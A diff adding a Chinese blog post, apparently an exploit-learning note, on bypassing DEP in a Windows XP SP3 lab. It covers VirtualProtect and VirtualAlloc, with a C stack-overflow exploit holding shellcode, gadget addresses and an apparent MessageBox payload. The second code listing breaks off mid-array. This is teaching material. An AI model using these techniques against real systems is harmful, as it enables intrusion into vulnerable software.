@@ -1,0 +1,258 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Ret2Libc之利用VirtualProtect和VirtualAlloc攻击DEP攻击DEP"><title>漏洞利用学习笔记-015-利用VirtualProtect和VirtualAlloc攻击DEP</title><link rel=canonical href=https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-015-%E5%88%A9%E7%94%A8virtualprotect%E5%92%8Cvirtualalloc%E6%94%BB%E5%87%BBdep/><link rel=stylesheet href=/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css><meta property="og:title" content="漏洞利用学习笔记-015-利用VirtualProtect和VirtualAlloc攻击DEP"><meta property="og:description" content="Ret2Libc之利用VirtualProtect和VirtualAlloc攻击DEP攻击DEP"><meta property="og:url" content="https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-015-%E5%88%A9%E7%94%A8virtualprotect%E5%92%8Cvirtualalloc%E6%94%BB%E5%87%BBdep/"><meta property="og:site_name" content="Misaka的秘密花园"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="Windows"><meta property="article:tag" content="数据执行保护"><meta property="article:published_time" content="2020-11-19T17:43:00+08:00"><meta property="article:modified_time" content="2020-11-19T17:43:00+08:00"><meta name=twitter:title content="漏洞利用学习笔记-015-利用VirtualProtect和VirtualAlloc攻击DEP"><meta name=twitter:description content="Ret2Libc之利用VirtualProtect和VirtualAlloc攻击DEP攻击DEP"><script async src=https://umami.moeomu.com/Prototype data-website-id=da63d88b-4c19-4ee6-93cc-e12bd941eb81></script></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/zh-cn><img src=/img/avatar_hu5c4b01d6d06a4818a5284ca6e51e5ac9_24136_300x0_resize_q75_box.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a>
+<span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/zh-cn>Misaka的秘密花园</a></h1><h2 class=site-description>In the gardens embrace, a celestial sprite dances.</h2></div></header><ol class=social-menu><li><a href=https://github.com/Misakaou target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/zh-cn/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>主页</span></a></li><li><a href=/zh-cn/%E5%BD%92%E6%A1%A3/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>归档</span></a></li><li><a href=/zh-cn/%E6%90%9C%E7%B4%A2/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>搜索</span></a></li><li><a href=/zh-cn/%E9%93%BE%E6%8E%A5/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg><span>链接</span></a></li><li><a href=/zh-cn/%E7%95%99%E8%A8%80%E6%9D%BF/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg><span>留言板</span></a></li><li><a href=/zh-cn/%E5%85%B3%E4%BA%8E/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg><span>关于</span></a></li><div class=menu-bottom-section><li id=i18n-switch><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><select name=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://blog.moeomu.com/>English</option><option value=https://blog.moeomu.com/zh-cn/ selected>中文</option></select></li><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>暗色模式</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#利用virtualprotect攻击dep>利用VirtualProtect攻击DEP</a><ol><li><a href=#原理>原理</a></li><li><a href=#前置内容>前置内容</a></li><li><a href=#步骤>步骤</a></li><li><a href=#代码>代码</a></li></ol></li><li><a href=#利用virtualalloc攻击dep>利用VirtualAlloc攻击DEP</a><ol><li><a href=#前置内容-1>前置内容</a></li><li><a href=#代码-1>代码</a></li><li><a href=#技术细节>技术细节</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/zh-cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/>漏洞利用</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-015-%E5%88%A9%E7%94%A8virtualprotect%E5%92%8Cvirtualalloc%E6%94%BB%E5%87%BBdep/>漏洞利用学习笔记-015-利用VirtualProtect和VirtualAlloc攻击DEP</a></h2><h3 class=article-subtitle>Ret2Libc之利用VirtualProtect和VirtualAlloc攻击DEP攻击DEP</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Nov 19, 2020</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>阅读时长: 2 分钟</time></div></footer><footer class=article-translations><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><div><a href=https://blog.moeomu.com/posts/exploit-learning-notes-015-using-virtualprotect-and-virtualalloc-attack-dep/ class=link>English</a></div></footer></div></header><section class=article-content><p>本文来源：<a class=link href=/zh-cn/posts/%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0-015-%e5%88%a9%e7%94%a8virtualprotect%e5%92%8cvirtualalloc%e6%94%bb%e5%87%bbdep/>Moeomu的博客</a></p><h2 id=利用virtualprotect攻击dep>利用VirtualProtect攻击DEP</h2><h3 id=原理>原理</h3><blockquote><p>利用<code>VirtualProtect</code>函数将栈页内存属性改为可执行</p></blockquote><h3 id=前置内容>前置内容</h3><ul><li>VirtualProtect参数</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=n>BOOL</span> <span class=nf>VirtualProtect</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=n>LPVOID</span> <span class=n>lpAddress</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>DWORD</span> <span class=n>dwSize</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>DWORD</span> <span class=n>flNewProtect</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>PDWORD</span> <span class=n>lpflOldProtect</span>
+</span></span><span class=line><span class=cl><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// 所以可以这样写
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>BOOL</span> <span class=nf>VirtualProtect</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=err>所在内存空间起始地址</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=err>大小</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=mh>0x40</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=err>某个可写地址</span>
+</span></span><span class=line><span class=cl><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>这里势必存在0，因此攻击函数换为memcpy</li></ul><h3 id=步骤>步骤</h3><ul><li>修复EBP，这样调用函数的时候不会内存读取违规而异常</li><li>填入VirtualProtect的地址，将会返回于此</li><li>填入空的指令</li><li>填入返回地址</li><li>填入函数的参数</li><li>填入shellcode本身</li></ul><h3 id=代码>代码</h3><blockquote><p>模拟环境：系统：Windows XP SP3，DEP：Optout，编译器：VC6，编译选项：禁用优化，版本：release</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include&lt;windows.h&gt;
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x85\x8B\x1D\x5D</span><span class=s>&#34;</span> <span class=c1>// push esp pop ebp ret `fix ebp`
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\xD4\x1A\x80\x7C</span><span class=s>&#34;</span> <span class=c1>// VirtualProtect Address
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x8C\xFE\x12\x00</span><span class=s>&#34;</span> <span class=c1>// ret Address
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\xB0\xFD\x12\x00</span><span class=s>&#34;</span> <span class=c1>// Param Address: 0x0012FDB0
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\xFF\x00\x00\x00</span><span class=s>&#34;</span> <span class=c1>// Param Size: 0x100
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x40\x00\x00\x00</span><span class=s>&#34;</span> <span class=c1>// Param NewProtect: 0x40
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x00\x00\x3F\x00</span><span class=s>&#34;</span> <span class=c1>// Param pOldProtect: 0x00910000
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C</span><span class=s>&#34;</span> <span class=c1>// payload
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>test</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>str</span><span class=p>[</span><span class=mi>176</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=n>memcpy</span><span class=p>(</span><span class=n>str</span><span class=p>,</span> <span class=n>shellcode</span><span class=p>,</span> <span class=mi>420</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>HINSTANCE</span> <span class=n>hInst</span> <span class=o>=</span> <span class=n>LoadLibrary</span><span class=p>(</span><span class=s>&#34;shell32.dll&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>temp</span><span class=p>[</span><span class=mi>200</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=n>test</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=利用virtualalloc攻击dep>利用VirtualAlloc攻击DEP</h2><h3 id=前置内容-1>前置内容</h3><ul><li>VirtualAlloc参数</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=n>LPVOID</span> <span class=n>WINAPI</span> <span class=n>VirtualAlloc</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=n>__in_opt</span> <span class=n>LPVOID</span> <span class=n>lpAddress</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>__in</span> <span class=n>SIZE_T</span> <span class=n>dwSize</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>__in</span> <span class=n>DWORD</span> <span class=n>flAllocationType</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>__in</span> <span class=n>DWORD</span> <span class=n>flProtect</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>参数说明<ul><li><code>lpAddress</code>，申请内存区域的地址，如果这个参数是<code>NULL</code>，系统将会决定分配内存区域的位置，并且按<code>64KB</code>向上取整</li><li><code>dwSize</code>，申请内存区域的大小</li><li><code>flAllocationType</code>，申请内存的类型</li><li><code>flProtect</code>，申请内存的访问控制类型，如读、写、执行等权限。内存申请成功时函数返回申请内存的起始地址，申请失败时返回<code>NULL</code></li></ul></li></ul><h3 id=代码-1>代码</h3><blockquote><p>模拟环境：系统：Windows XP SP3，DEP：Optout，编译器：VC6，编译选项：禁用优化，版本：release</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
